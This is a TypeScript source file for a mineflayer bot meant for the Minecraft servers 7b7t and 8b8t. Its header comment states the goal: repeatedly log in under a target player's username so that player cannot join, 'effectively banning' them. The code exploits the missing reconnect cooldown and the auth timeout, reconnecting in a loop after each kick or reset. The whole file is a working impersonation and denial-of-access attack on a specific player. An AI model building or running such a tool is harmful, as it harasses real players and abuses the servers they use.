/*
    ============================= main goal =============================
    create a bot that will repeatedly try to join the server under some
    player's nick in order to effectively ban them from joining the server.

    ================================== 7b7t ==================================
    7b had no reconnection cool down if the player was online, so the bot could
    instantly try to reconnect to the server, maximising chances of connecting
    at just the right time to join the server and stop the player from joining.

    Also, 7b had a 1m auth timeout, after which you get kicked for not logging
    in before the timeout ended.
    bot usually took about 1s to join the server.

    ========================== 8b8t ==========================
    not yet tested on 8b, prob everything will be the same tho
*/

import 'colors'
import { Bot } from 'mineflayer'
import { host, username, port } from '../config.json'
import {createAttackBot, log } from './shared'

let bot: Bot | null
process.on('uncaughtException', exception => {
  if (bot == null) return

  if (exception.message.includes('ECONNRESET')) {
    log('ECONNRESET'.red)
    // end connection properly
    bot.end()
    // attempt to fix memory leaks
    bot.removeAllListeners()
    bot = null
    // reconnect
    troll()
  }
})
log('Started'.green)
troll()

function troll (): void {
  log('[Bot] Logging in...'.yellow)
  // create the bot
  bot = createAttackBot({
    host: host,
    port: port,
    username: username
  })
  // parse kick reason if kicked
  bot.once('kicked', async reason => {
    if (bot == null) return

    if (reason.includes('You are already connected to this proxy!')) {
      // player is online
      log('[Bot] Kicked - target is online.'.red)
      bot.end()
      bot.removeAllListeners()
      bot = null
      troll()
    } else if (reason.includes('You took to long to login or register')) {
      // auth timeout
      log('[Bot] Kicked - authentication timeout.'.red)
      bot.end()
      bot.removeAllListeners()
      bot = null
      troll()
    } else log(reason)
  })
  bot.once('login', () => {
    log('[Bot] Logged in'.green)
  })
  bot.on('messagestr', message => {
    log(message.cyan)
  })
}
